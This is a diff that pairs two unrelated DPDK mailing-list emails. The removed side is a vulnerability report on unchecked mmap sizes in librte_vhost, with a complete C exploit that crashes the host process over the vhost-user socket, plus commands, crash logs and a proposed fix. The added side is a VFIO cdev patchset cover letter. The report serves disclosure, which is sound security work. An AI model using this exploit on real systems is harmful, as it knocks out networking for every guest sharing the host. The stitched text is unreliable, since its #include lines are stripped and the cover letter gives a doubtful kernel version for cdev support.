@@ -2,45 +2,49 @@ Return-Path: <dev-bounces@dpdk.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from mails.dpdk.org (mails.dpdk.org [217.70.189.124])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id B62E7C61DBD
-	for <dpdk-dev@archiver.kernel.org>; Fri, 28 Aug 2026 12:52:54 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id DBBB3C61DB9
+	for <dpdk-dev@archiver.kernel.org>; Fri, 28 Aug 2026 13:07:06 +0000 (UTC)
 Received: from mails.dpdk.org (localhost [127.0.0.1])
-	by mails.dpdk.org (Postfix) with ESMTP id 9F2E440151;
-	Fri, 28 Aug 2026 14:52:53 +0200 (CEST)
-Received: from inbox.dpdk.org (inbox.dpdk.org [95.142.172.178])
- by mails.dpdk.org (Postfix) with ESMTP id 9B3CF40150
- for <dev@dpdk.org>; Fri, 28 Aug 2026 14:52:52 +0200 (CEST)
-Received: by inbox.dpdk.org (Postfix, from userid 33)
- id 6AC494CF7D; Fri, 28 Aug 2026 14:52:52 +0200 (CEST)
-From: bugzilla@dpdk.org
+	by mails.dpdk.org (Postfix) with ESMTP id 0951640151;
+	Fri, 28 Aug 2026 15:07:06 +0200 (CEST)
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.7])
+ by mails.dpdk.org (Postfix) with ESMTP id 5844D40150
+ for <dev@dpdk.org>; Fri, 28 Aug 2026 15:07:04 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+ d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
+ t=1787922424; x=1819458424;
+ h=from:to:subject:date:message-id:in-reply-to:references:
+ mime-version:content-transfer-encoding;
+ bh=JbfvmbhSpGYIUjFwFvAH23Rz4Cm6uhjLmM12e3Wp92U=;
+ b=KfPWn0b7/1H8TYEdx6STJgDshr1fS6RsovikXUy51qliYdqW5C85am2r
+ grNd9rzGikYDQqYjw+4KXYTejeHlkew+lpbKu8hSJHfQGqMhYuCWL0cvR
+ lbp5cGSC+h157e1RN24CzkqvbCRrqZ6gm5iehYBbquPGWE2lYTY3cF9MX
+ rMp+VjHGoBfub+zCghmI/VZkE2WJvZytl18mOJwOvkcVKIAKDeFmuzS4f
+ 3pz9zNwe+yc6RuMWpDUG2wXZekIlGb7HP/weIr9cT3vN3KVafdKy0m71/
+ tzyVLJefvBvd9VxM0p/G4UXQuopzSioaTBDncgV97j4O5yz0GXn6wjftb Q==;
+X-CSE-ConnectionGUID: CzFh/N9AQ92FswqAKID0/Q==
+X-CSE-MsgGUID: mQe5l8DvT4G1N9XC/uxWDA==
+X-IronPort-AV: E=McAfee;i="6800,10657,11888"; a="113964490"
+X-IronPort-AV: E=Sophos;i="6.25,248,1779174000"; d="scan'208";a="113964490"
+Received: from orviesa004.jf.intel.com ([10.64.159.144])
+ by fmvoesa101.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384;
+ 28 Aug 2026 06:07:03 -0700
+X-CSE-ConnectionGUID: rTAJVu70T5qDrXUIApnshw==
+X-CSE-MsgGUID: boHarE3+SPGE3+PkDbOH6A==
+X-ExtLoop1: 1
+X-IronPort-AV: E=Sophos;i="6.25,248,1779174000"; d="scan'208";a="271959526"
+Received: from silpixa00401119.ir.intel.com ([10.20.224.206])
+ by orviesa004.jf.intel.com with ESMTP; 28 Aug 2026 06:07:01 -0700
+From: Anatoly Burakov <anatoly.burakov@intel.com>
 To: dev@dpdk.org
-Subject: [DPDK/vhost/virtio Bug 2002] vhost memory size validation before mmap
-Date: Fri, 28 Aug 2026 12:52:52 +0000
-X-Bugzilla-Reason: AssignedTo
-X-Bugzilla-Type: new
-X-Bugzilla-Watch-Reason: None
-X-Bugzilla-Product: DPDK
-X-Bugzilla-Component: vhost/virtio
-X-Bugzilla-Version: unspecified
-X-Bugzilla-Keywords: 
-X-Bugzilla-Severity: normal
-X-Bugzilla-Who: thomas@monjalon.net
-X-Bugzilla-Status: UNCONFIRMED
-X-Bugzilla-Resolution: 
-X-Bugzilla-Priority: Normal
-X-Bugzilla-Assigned-To: dev@dpdk.org
-X-Bugzilla-Target-Milestone: ---
-X-Bugzilla-Flags: 
-X-Bugzilla-Changed-Fields: bug_id short_desc product version rep_platform
- op_sys bug_status bug_severity priority component assigned_to reporter
- target_milestone bug_group
-Message-ID: <bug-2002-3@https.bugs.dpdk.org/>
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain; charset=UTF-8
-X-Bugzilla-URL: https://bugs.dpdk.org/
-Auto-Submitted: auto-generated
-X-Auto-Response-Suppress: All
+Subject: [PATCH v14 00/25] Support VFIO cdev API in DPDK
+Date: Fri, 28 Aug 2026 14:06:28 +0100
+Message-ID: <cover.1787922362.git.anatoly.burakov@intel.com>
+X-Mailer: git-send-email 2.52.0
+In-Reply-To: <cover.1763141462.git.anatoly.burakov@intel.com>
+References: <cover.1763141462.git.anatoly.burakov@intel.com>
 MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
 X-BeenThere: dev@dpdk.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -54,666 +58,247 @@ List-Subscribe: <https://mails.dpdk.org/listinfo/dev>,
  <mailto:dev-request@dpdk.org?subject=subscribe>
 Errors-To: dev-bounces@dpdk.org
 
-https://bugs.dpdk.org/show_bug.cgi?id=3D2002
+This patchset depends on the following:
+* https://patches.dpdk.org/project/dpdk/list/?series=39072 ("net/nbl: fix use-after-free")
+
+This patchset introduces a major refactor of the VFIO subsystem in DPDK to
+support character device (cdev) interface introduced in Linux kernel, as well as
+make the API more streamlined and useful. The goal is to simplify device
+management, improve compatibility, make the code readable, and clarify API.
+
+The following sections outline the key issues addressed by this patchset and the
+corresponding changes introduced.
+
+1. Only group mode is supported
+===============================
+
+Since kernel version 4.14.327 (LTS), VFIO supports the new character device
+(cdev)-based way of working with VFIO devices (otherwise known as IOMMUFD). This
+is a device-centric mode and does away with all the complexity regarding groups
+and IOMMU types, delegating it all to the kernel, and exposes a much simpler
+interface to userspace. The old group-based implementation will still be around,
+and will need to be kept in DPDK for compatibility reasons.
+
+To enable this, VFIO is heavily refactored, so that the code can support both
+modes while relying on (mostly) common infrastructure.
+
+Additionally, a new `rte_vfio_get_mode` API is added for those cases that need
+some introspection into VFIO's internals, with three new modes: group
+(old-style), no-iommu (old-style but without IOMMU), and cdev (the new mode).
+Although no-IOMMU is technically a variant of group mode, the distinction is
+largely irrelevant to the user, as all usages of noiommu checks in our codebase
+are for deciding whether to use IOVA or PA, not anything to do with managing
+groups. The current plan for kernel community is to *not* introduce no-IOMMU
+cdev implementation, and IOMMUFD's own group API compatibility layer also does
+not implement no-IOMMU mode, which is why a no-IOMMU mode looks like a distinct
+VFIO mode to the outside observer, even though internally it uses group mode.
+
+2. Custom container assignment API does not map to cdev mode
+============================================================
+
+The existing `rte_vfio_device_setup/release` model is fundamentally incompatible
+with cdev mode, because for custom container cases, the expected flow is that
+the user binds the IOMMU group (and thus, implicitly, the device itself) to a
+specific container using `rte_vfio_container_group_bind`, whereas this step is
+not needed for cdev as the device fd is assigned to the container straight away.
+
+Therefore, what we do instead is introduce a new API for container device
+assignment which, semantically, will assign a device to specified container, so
+that when it is mapped using `rte_pci_map_device`, the appropriate container is
+selected. Under the hood though, we essentially transition to getting device fd
+straight away at assign stage, so that by the time the PCI bus attempts to map
+the device, it is already mapped and we just return an fd. There is no
+"unassign" API because `release_device` already performs that function.
+
+Because the API is now unified around device assignment, the old group-specific
+API's can be removed and, where appropriate, reimplemented using new API. There
+were other users of VFIO which relied on group API but only for convenience
+purposes; no actual VFIO functionality depended on those API's.
+
+List of removed API's:
+
+* `rte_vfio_get_group_fd`
+* `rte_vfio_clear_group`
+* `rte_vfio_container_group_bind` (replaced by container assign API)
+* `rte_vfio_container_group_unbind`
+* `rte_vfio_noiommu_is_enabled` (replaced by new mode API)
+
+3. The API responsibilities aren't clear and bleed into each other
+==================================================================
+
+Some API's do multiple things at once. In particular:
+
+* `rte_vfio_get_device_info` will setup the device
+* `rte_vfio_setup_device` will get device info
+
+These API's have been adjusted to do one thing only.
+
+4. The API does not need to be public
+=====================================
+
+The initial idea for exposing VFIO API was to enable userspace applications to
+directly map memory for DMA, but it turns out that in practice only drivers use
+this API. Therefore, the entire VFIO API is made internal, driver-only, and is
+renamed from `rte_vfio` to `dev_vfio`.
+
+v14:
+- Hardened the transitional patches against attempting to use VFIO without
+  having done initialization
+- Fixed a bunch of typos, moved a few hunks around to where they belong, and
+  added a more release note entries
+
+v13:
+- Addressed feedback from Stephen's AI review:
+  - Added strdup-based deduplication for group mode to avoid leaking fd's when
+    container assignment API is used
+  - Added more documentation about cdev mode to Linux GSG
+  - Fixed comments and log levels in a couple of places
+- Renamed the API from `rte_vfio_*` to `dev_vfio_*` on account of it no longer
+  being a publicly visible API
+- Moved `dev_vfio.h` into driver SDK headers
+- Decoupled VFIO internals from FSLMC and EAL
+- Added proper teardown for VFIO subsystem on cleanup
+
+v12:
+- Addressed feedback from Stephen's AI review:
+  - Add release notes updates to patch 2 and 20
+  - Fix ENXIO typos
+  - Added a new init step after memory init to enable DMA mapping for cdev
+
+v11:
+- Addressed feedback from Stephen's AI review:
+  - Use CONTAINER_INITIALIZER for reset
+  - Set container fd to -1 in CONTAINER_INITIALIZER
+  - Fixed double close()
+  - Moved VFIO init to earlier in init sequence to account for
+    bus drivers needing no-IOMMU mode status
+  - Fixed missing ops set for cdev mode, and missing ops reset
+  - Fixed fd leak on failed attach in cdev
+
+v10:
+- Added a patch that renames confusing error labels
+- Fixed compiler warning about unused variable
+
+v9:
+- Moved erroneous rte_errno-related comments to later in the patchset
+- Moved removal of vDPA group fd API's to their respective patches
+- Fixed typo in errno comments (ENXIO vs ENOXIO)
+- Fixed corruption of group config in secondary process (v8 AI review)
+
+v8:
+- Rebase
+- Fixed build errors due to variable shadowing
+- Removed duplicate fd check as kernel does not provide a way to distinguish
+  between device fd's
+
+v7:
+- Rebase
+- Added removal of deprecation notices
+- Fixed implicit numeric comparison in patch 12
+
+v6:
+- Fixed missing header include in vfio cdev file
+
+v5:
+- Added back missing uapi patch
+
+v4:
+- Fixed issues with documenting rte_vfio_mode enum
+- Separated deprecation notices into a separate patchset
+
+v3:
+- Make API removal cleaner
+- Fix `get_group_num` usages to align with new API
+- Fix issues with function exports
+- Fix issues with `setup_device` returning old-style values in some cases
+
+v2:
+- Make the entire API internal
+- More aggressive API pruning, complete removal of group API
+- Fixed a bug in group mode where device could not be used
+- Better documentation and deprecation notice patches
+- Moved doc patches to beginning of patchset
+
+Anatoly Burakov (25):
+  uapi: update to v6.17 and add iommufd.h
+  vfio: make all functions internal
+  bus/fslmc: decouple from EAL VFIO
+  vfio: decouple EAL from VFIO internals
+  vfio: do proper teardown on VFIO cleanup
+  vfio: remove modname parameter from init
+  vfio: rename API to reflect internal status
+  bus/pci: rename mismatching error labels
+  vfio: split get device info from setup
+  vfio: add container device assignment API
+  net/nbl: do not use VFIO group bind API
+  net/ntnic: use container device assignment API
+  vdpa/ifc: use container device assignment API
+  vdpa/nfp: use container device assignment API
+  vdpa/sfc: use container device assignment API
+  vdpa/mlx5: remove group-related API
+  vhost: remove group-related API from driver
+  vfio: remove group-based API
+  vfio: cleanup and refactor
+  bus/pci: use the new VFIO mode API
+  bus/fslmc: use the new VFIO mode API
+  net/hinic3: use the new VFIO mode API
+  net/ntnic: use the new VFIO mode API
+  vfio: remove no-IOMMU check API
+  vfio: introduce cdev mode
+
+ config/arm/meson.build                    |    1 +
+ config/meson.build                        |    1 +
+ doc/api/doxy-api-index.md                 |    3 +-
+ doc/guides/linux_gsg/linux_drivers.rst    |   30 +
+ doc/guides/prog_guide/vhost_lib.rst       |    4 -
+ doc/guides/rel_notes/deprecation.rst      |   10 -
+ doc/guides/rel_notes/release_26_11.rst    |   16 +
+ drivers/bus/cdx/cdx.c                     |    6 +-
+ drivers/bus/cdx/cdx_vfio.c                |   37 +-
+ drivers/bus/fslmc/fslmc_bus.c             |   13 +-
+ drivers/bus/fslmc/fslmc_vfio.c            |   66 +-
+ drivers/bus/fslmc/meson.build             |    1 -
+ drivers/bus/pci/linux/pci.c               |    4 +-
+ drivers/bus/pci/linux/pci_vfio.c          |   79 +-
+ drivers/bus/pci/pci_common.c              |   10 +-
+ drivers/bus/platform/platform.c           |   17 +-
+ drivers/crypto/bcmfs/bcmfs_vfio.c         |   20 +-
+ drivers/net/hinic3/base/hinic3_hwdev.c    |    5 +-
+ drivers/net/nbl/nbl_common/nbl_userdev.c  |   34 +-
+ drivers/net/nbl/nbl_include/nbl_include.h |    1 +
+ drivers/net/ntnic/ntnic_ethdev.c          |   10 +-
+ drivers/net/ntnic/ntnic_vfio.c            |   48 +-
+ drivers/vdpa/ifc/ifcvf_vdpa.c             |   54 +-
+ drivers/vdpa/mlx5/mlx5_vdpa.c             |    1 -
+ drivers/vdpa/nfp/nfp_vdpa.c               |   53 +-
+ drivers/vdpa/sfc/sfc_vdpa.c               |   47 +-
+ drivers/vdpa/sfc/sfc_vdpa.h               |    2 -
+ drivers/vdpa/sfc/sfc_vdpa_hw.c            |   12 +-
+ kernel/linux/uapi/linux/iommufd.h         | 1292 ++++++++++
+ kernel/linux/uapi/linux/vduse.h           |    2 +-
+ kernel/linux/uapi/linux/vfio.h            |   12 +-
+ kernel/linux/uapi/version                 |    2 +-
+ lib/eal/freebsd/eal.c                     |  100 +-
+ lib/eal/include/dev_vfio.h                |  449 ++++
+ lib/eal/include/meson.build               |    2 +-
+ lib/eal/include/rte_vfio.h                |  338 ---
+ lib/eal/linux/eal.c                       |   27 +-
+ lib/eal/linux/eal_vfio.c                  | 2635 +++++++++------------
+ lib/eal/linux/eal_vfio.h                  |  191 +-
+ lib/eal/linux/eal_vfio_cdev.c             |  396 ++++
+ lib/eal/linux/eal_vfio_group.c            |  983 ++++++++
+ lib/eal/linux/eal_vfio_mp_sync.c          |  108 +-
+ lib/eal/linux/meson.build                 |    2 +
+ lib/eal/windows/eal.c                     |   16 +-
+ lib/vhost/vdpa_driver.h                   |    3 -
+ lib/vhost/vhost_user.c                    |   16 +-
+ 46 files changed, 4885 insertions(+), 2274 deletions(-)
+ create mode 100644 kernel/linux/uapi/linux/iommufd.h
+ create mode 100644 lib/eal/include/dev_vfio.h
+ delete mode 100644 lib/eal/include/rte_vfio.h
+ create mode 100644 lib/eal/linux/eal_vfio_cdev.c
+ create mode 100644 lib/eal/linux/eal_vfio_group.c
+
+-- 
+2.52.0
 
-            Bug ID: 2002
-           Summary: vhost memory size validation before mmap
-           Product: DPDK
-           Version: unspecified
-          Hardware: All
-                OS: All
-            Status: UNCONFIRMED
-          Severity: normal
-          Priority: Normal
-         Component: vhost/virtio
-          Assignee: dev@dpdk.org
-          Reporter: thomas@monjalon.net
-  Target Milestone: ---
-             Group: security
-
-Report date: 2026-04-09
-Reported by: Don Salvatore Nero <hemo40047@gmail.com>
-
-Dear DPDK Security Team
-
-Security Vulnerability Report
-
-DPDK librte_vhost =E2=80=94 Memory Size Validation Missing Before mmap()
-
-Executive Summary
-
-A Denial-of-Service vulnerability was discovered in DPDK version 25.11.0
-(stable) in the librte_vhost library. The function vhost_user_mmap_region()=
- in
-lib/vhost/vhost_user.c calls mmap() with a size value supplied directly by =
-an
-untrusted guest without validating it against the actual file size (st_size=
-).
-This allows a malicious guest to cause a segmentation fault (SIGBUS/segfaul=
-t)
-that crashes the entire DPDK host process.
-
-Basic Information
-
-Element Details
-
- Discovered by:  Don Salvatori Nero
-
-Affected Version DPDK 25.11.0 (stable)
-
-Affected File lib/vhost/vhost_user.c
-
-Affected Functions vhost_user_mmap_region(), vhost_user_set_mem_table()
-
-Vulnerability Class CWE-20 =E2=80=94 Improper Input Validation
-
-Impact Denial of Service =E2=80=94 full crash of the DPDK host process
-
-Attack Vector Malicious guest via vhost-user Unix socket
-
-Discovery Methodology
-
-The vulnerability was identified through a comprehensive source code audit =
-of
-the DPDK vhost-user implementation. The analysis traced the end-to-end data
-flow from untrusted guest input to the critical mmap() system call,
-systematically examining each validation point along the path. The
-investigation involved reviewing message routing mechanisms, memory region
-parsing logic, and the absence of file size verification prior to memory
-mapping operations.
-
-1. Entry Point =E2=80=94 Message Routing
-
-The first step was identifying how guest messages are routed in
-lib/vhost/vhost_user.c:
-
-// lib/vhost/vhost_user.c:73
-
-VHOST_MESSAGE_HANDLER(VHOST_USER_SET_MEM_TABLE, vhost_user_set_mem_table, t=
-rue,
-true)
-
-This line confirms that any guest connection can send VHOST_USER_SET_MEM_TA=
-BLE
-and it will be routed directly to vhost_user_set_mem_table().
-
-2. First Function =E2=80=94 vhost_user_set_mem_table()
-
-Location: lib/vhost/vhost_user.c:1386
-
-The function reads guest-supplied memory region data and copies it without
-validating memory_size:
-
-// lib/vhost/vhost_user.c:1465-1488
-
-for (i =3D 0; i < memory->nregions; i++) {
-
-    reg =3D &dev->mem->regions[i];
-
-    reg->guest_phys_addr =3D memory->regions[i].guest_phys_addr;
-
-    reg->guest_user_addr =3D memory->regions[i].userspace_addr;
-
-    reg->size =3D memory->regions[i].memory_size;      // =E2=86=90 guest v=
-alue, no check
-
-    reg->fd =3D ctx->fds[i];
-
-    ctx->fds[i] =3D -1;
-
-    mmap_offset =3D memory->regions[i].mmap_offset;
-
-
-
-    if (vhost_user_mmap_region(dev, reg, mmap_offset) < 0) {
-
-        goto free_mem_table;
-
-    }
-
-}
-
-What was validated: only nregions count:
-
-// lib/vhost/vhost_user.c:1399
-
-if (memory->nregions > VHOST_MEMORY_MAX_NREGIONS) {
-
-    goto close_msg_fds;
-
-}
-
-What was NOT validated: memory_size against the actual file size of
-ctx->fds[i].
-
-3. Second Function =E2=80=94 vhost_user_mmap_region()
-
-Location: lib/vhost/vhost_user.c:1289
-
-Full function analysis:
-
-vhost_user_mmap_region(struct virtio_net *dev, struct rte_vhost_mem_region
-*region,
-
-                       uint64_t mmap_offset)
-
-{
-
-    void *mmap_addr;
-
-    uint64_t mmap_size;
-
-    uint64_t alignment;
-
-    int populate;
-
-    // CHECK 1: integer overflow =E2=80=94 CORRECT
-
-    if (mmap_offset >=3D -region->size) {
-
-        return -1;
-
-    }
-
-    // mmap_size comes entirely from guest
-
-    mmap_size =3D region->size + mmap_offset;
-
-    // get_blk_size reads st_blksize =E2=80=94 NOT st_size
-
-    alignment =3D get_blk_size(region->fd);
-
-    if (alignment =3D=3D (uint64_t)-1) {
-
-        return -1;
-
-    }
-
-    // align size upward
-
-    mmap_size =3D RTE_ALIGN_CEIL(mmap_size, alignment);
-
-    // CHECK 2: zero overflow =E2=80=94 CORRECT
-
-    if (mmap_size =3D=3D 0) {
-
-        return -1;
-
-    }
-
-    // =E2=86=90 NO CHECK HERE: mmap_size vs actual file st_size
-
-    populate =3D dev->async_copy ? MAP_POPULATE : 0;
-
-    // mmap called with guest-controlled size
-
-    mmap_addr =3D mmap(NULL, mmap_size, PROT_READ | PROT_WRITE,
-
-                     MAP_SHARED | populate, region->fd, 0);
-
-    // only MAP_FAILED is checked =E2=80=94 succeeds with oversized mapping
-
-    if (mmap_addr =3D=3D MAP_FAILED) {
-
-        return -1;
-
-    }
-
-    region->mmap_addr =3D mmap_addr;
-
-    region->mmap_size =3D mmap_size;
-
-    region->host_user_addr =3D (uint64_t)(uintptr_t)mmap_addr + mmap_offset;
-
-    return 0;
-
-}
-
-4. Third Function =E2=80=94 get_blk_size()
-
-Location: lib/vhost/vhost_user.c:165
-
-get_blk_size(int fd)
-
-{
-
-    struct stat stat;
-
-    int ret;
-
-    ret =3D fstat(fd, &stat);
-
-    return ret =3D=3D -1 ? (uint64_t)-1 : (uint64_t)stat.st_blksize;
-
-}
-
-Critical finding: fstat() is called but only st_blksize (preferred I/O block
-size) is returned. st_size (actual file size) is never read anywhere in
-lib/vhost/vhost_user.c:
-
-grep -rn "st_size" lib/vhost/vhost_user.c
-
-# =E2=86=92 no output
-
-5. Confirmation =E2=80=94 No Fix in Git History
-
-git log --oneline -- lib/vhost/vhost_user.c | \
-
-grep -i "mmap\|fix\|CVE\|size\|overflow" | head -10
-
-Output:
-
-bdd96d8ac7 vhost: fix offset while mapping log base address
-
-47358f8f50 vhost: fix virtqueue access lock check for handlers
-
-3bb7df6a95 vhost: fix vring addr update with vDPA
-
-...
-
-No commit in the entire history addresses missing st_size validation before
-mmap().
-
-6. Root Cause Summary
-
-Data flow from guest to crash:
-
-Guest sends VHOST_USER_SET_MEM_TABLE
-
-    =E2=86=93
-
-vhost_user_set_mem_table()
-
-    reg->size =3D memory->regions[i].memory_size   =E2=86=90 guest value, n=
-o size check
-
-    reg->fd =3D ctx->fds[i]                        =E2=86=90 guest fd
-
-    =E2=86=93
-
-vhost_user_mmap_region()
-
-    mmap_size =3D region->size + mmap_offset       =E2=86=90 still guest va=
-lue
-
-    get_blk_size(fd) =E2=86=92 st_blksize only           =E2=86=90 NOT st_s=
-ize
-
-    mmap(NULL, mmap_size, ..., fd, 0)            =E2=86=90 oversized mappin=
-g succeeds
-
-    =E2=86=93
-
-Later access to address beyond real file size
-
-    =E2=86=93
-
-Linux kernel sends SIGBUS =E2=86=92 segfault =E2=86=92 DPDK process crashes
-
-7. Proof of Concept
-
-Environment Setup
-
-=C2=B7 DPDK version: 25.11.0 stable
-
-=C2=B7 OS: Ubuntu 22.04.5 LTS (Linux 5.15.0-122-generic x86_64)
-
-Step 1 =E2=80=94 Build and run DPDK testpmd
-
-sudo ./build/app/dpdk-testpmd \
-
-  -l 0-1 --in-memory --no-pci \
-
-  --vdev 'net_vhost0,iface=3D/tmp/vhost-net,client=3D0' -- -i
-
-Output confirmed DPDK running and listening:
-
-VHOST_CONFIG: (/tmp/vhost-net) vhost-user server: socket created, fd: 201
-
-VHOST_CONFIG: (/tmp/vhost-net) binding succeeded
-
-Step 2 =E2=80=94 Exploit code
-
-#include=20
-
-#include=20
-
-#include=20
-
-#include=20
-
-#include=20
-
-#include=20
-
-#include=20
-
-#include=20
-
-#include=20
-
-#include=20
-
-#define VHOST_USER_HDR_SIZE 12
-
-#define VHOST_USER_MEMORY_MAX_NREGIONS 8
-
-typedef enum VhostUserRequest {
-
-    VHOST_USER_NONE =3D 0,
-
-    VHOST_USER_GET_FEATURES =3D 1,
-
-    VHOST_USER_SET_FEATURES =3D 2,
-
-    VHOST_USER_SET_OWNER =3D 3,
-
-    VHOST_USER_SET_MEM_TABLE =3D 5,
-
-} VhostUserRequest;
-
-struct VhostUserMemoryRegion {
-
-    uint64_t guest_phys_addr;
-
-    uint64_t memory_size;
-
-    uint64_t userspace_addr;
-
-    uint64_t mmap_offset;
-
-};
-
-struct VhostUserMemory {
-
-    uint32_t nregions;
-
-    uint32_t padding;
-
-    struct VhostUserMemoryRegion regions[VHOST_USER_MEMORY_MAX_NREGIONS];
-
-};
-
-struct VhostUserMsg {
-
-    uint32_t request;
-
-    uint32_t flags;
-
-    uint32_t size;
-
-    union {
-
-        uint64_t u64;
-
-        struct VhostUserMemory memory;
-
-    } payload;
-
-} __attribute__((packed));
-
-static int send_vhost_message(int sockfd, struct VhostUserMsg *msg, int fd)=
- {
-
-    struct msghdr msgh;
-
-    struct iovec iov;
-
-    char control[CMSG_SPACE(sizeof(int))];
-
-
-
-    memset(&msgh, 0, sizeof(msgh));
-
-    iov.iov_base =3D msg;
-
-    iov.iov_len =3D VHOST_USER_HDR_SIZE + msg->size;
-
-    msgh.msg_iov =3D &iov;
-
-    msgh.msg_iovlen =3D 1;
-
-
-
-    if (fd !=3D -1) {
-
-        msgh.msg_control =3D control;
-
-        msgh.msg_controllen =3D sizeof(control);
-
-        struct cmsghdr *cmsg =3D CMSG_FIRSTHDR(&msgh);
-
-        cmsg->cmsg_len =3D CMSG_LEN(sizeof(int));
-
-        cmsg->cmsg_level =3D SOL_SOCKET;
-
-        cmsg->cmsg_type =3D SCM_RIGHTS;
-
-        memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
-
-    }
-
-
-
-    if (sendmsg(sockfd, &msgh, 0) < 0) {
-
-        perror("Failed to send vhost message");
-
-        return -1;
-
-    }
-
-    return 0;
-
-}
-
-int main(int argc, char *argv[]) {
-
-    if (argc < 2) {
-
-        printf("Usage: %s \n", argv[0]);
-
-        return -1;
-
-    }
-
-
-
-    int sockfd;
-
-    struct sockaddr_un addr;
-
-    char *socket_path =3D argv[1];
-
-
-
-    // Create small trap file =E2=80=94 real size 1MB
-
-    const char *shm_path =3D "/tmp/fake_mem";
-
-    int mem_fd =3D open(shm_path, O_RDWR | O_CREAT | O_TRUNC, 0666);
-
-    ftruncate(mem_fd, 1024 * 1024);
-
-
-
-    if ((sockfd =3D socket(AF_UNIX, SOCK_STREAM, 0)) =3D=3D -1) {
-
-        perror("Socket error");
-
-        return -1;
-
-    }
-
-
-
-    memset(&addr, 0, sizeof(addr));
-
-    addr.sun_family =3D AF_UNIX;
-
-    strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
-
-
-
-    printf("[*] Connecting to DPDK vhost socket: %s\n", socket_path);
-
-    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) =3D=3D -1) {
-
-        perror("Connect error");
-
-        return -1;
-
-    }
-
-
-
-    struct VhostUserMsg msg;
-
-
-
-    // Step 1: SET_OWNER
-
-    memset(&msg, 0, sizeof(msg));
-
-    msg.request =3D VHOST_USER_SET_OWNER;
-
-    msg.size =3D 0;
-
-    send_vhost_message(sockfd, &msg, -1);
-
-    printf("[+] Sent VHOST_USER_SET_OWNER\n");
-
-
-
-    // Step 2: Malicious SET_MEM_TABLE
-
-    memset(&msg, 0, sizeof(msg));
-
-    msg.request =3D VHOST_USER_SET_MEM_TABLE;
-
-    msg.flags =3D 0x1;
-
-    msg.payload.memory.nregions =3D 1;
-
-    msg.payload.memory.regions[0].guest_phys_addr =3D 0x0;
-
-    // Claim 10GB =E2=80=94 real file is 1MB
-
-    msg.payload.memory.regions[0].memory_size =3D 10ULL * 1024 * 1024 * 102=
-4;
-
-    msg.payload.memory.regions[0].userspace_addr =3D 0x4000000000ULL;
-
-    msg.payload.memory.regions[0].mmap_offset =3D 0;
-
-    msg.size =3D sizeof(struct VhostUserMemory);
-
-
-
-    printf("[!] Sending malicious SET_MEM_TABLE (claimed: 10GB, actual:
-1MB)\n");
-
-    send_vhost_message(sockfd, &msg, mem_fd);
-
-    printf("[+] Exploit sent. Waiting...\n");
-
-
-
-    sleep(2);
-
-
-
-    char buf[1];
-
-    if (read(sockfd, buf, 1) =3D=3D 0)
-
-        printf("[SUCCESS] DPDK crashed!\n");
-
-    else
-
-        printf("[FAILURE] DPDK still running.\n");
-
-
-
-    close(sockfd);
-
-    close(mem_fd);
-
-    unlink(shm_path);
-
-    return 0;
-
-}
-
-Step 3 =E2=80=94 Compile and run
-
-gcc vhost_exploit.c -o vhost_exploit
-
-sudo ./vhost_exploit /tmp/vhost-net
-
-Step 4 =E2=80=94 DPDK log confirms oversized mapping accepted
-
-VHOST_CONFIG: (/tmp/vhost-net) read message VHOST_USER_SET_MEM_TABLE
-
-VHOST_CONFIG: (/tmp/vhost-net) guest memory region size: 0x280000000
-
-VHOST_CONFIG: (/tmp/vhost-net) mmap addr : 0x7ffd68000000
-
-VHOST_CONFIG: (/tmp/vhost-net) mmap size : 0x280000000
-
-VHOST_CONFIG: (/tmp/vhost-net) mmap align: 0x1000
-
-VHOST_CONFIG: (/tmp/vhost-net) mmap off : 0x0
-
-mmap_size =3D 0x280000000 =3D 10GB =E2=80=94 accepted without error.
-
-Step 5 =E2=80=94 Crash confirmed
-
-dmesg | grep -i "testpmd" | tail -n 5
-
-[1836590.377750] dpdk-vhost-evt[1307789]: segfault at 10187cad8 ip
-0000555555a44be1 sp 00007fffeeff7470 error 4 in
-dpdk-testpmd[555555714000+2595000]
-
-error 4 =3D page not present =3D access beyond real file boundary.
-
-8. Impact
-
-Any process that can connect to the vhost-user Unix socket =E2=80=94 includ=
-ing any
-guest VM or container with access to it =E2=80=94 can crash the entire DPDK=
- host
-process with a single message. All other guests sharing the same DPDK insta=
-nce
-lose network connectivity instantly.
-
-9. Recommended Fix
-
-In vhost_user_mmap_region(), after calling fstat(), add a check comparing
-mmap_size against st_size:
-
-struct stat file_stat;
-
-if (fstat(region->fd, &file_stat) =3D=3D -1) {
-
-    return -1;
-
-}
-
-if (mmap_size > (uint64_t)file_stat.st_size) {
-
-    VHOST_CONFIG_LOG(dev->ifname, ERR,
-
-                     "mmap size (0x%" PRIx64 ") exceeds file size (0x%" PRI=
-x64
-")",
-
-                     mmap_size, (uint64_t)file_stat.st_size);
-
-    return -1;
-
-}
-
---=20
-You are receiving this mail because:
-You are the assignee for the bug.=
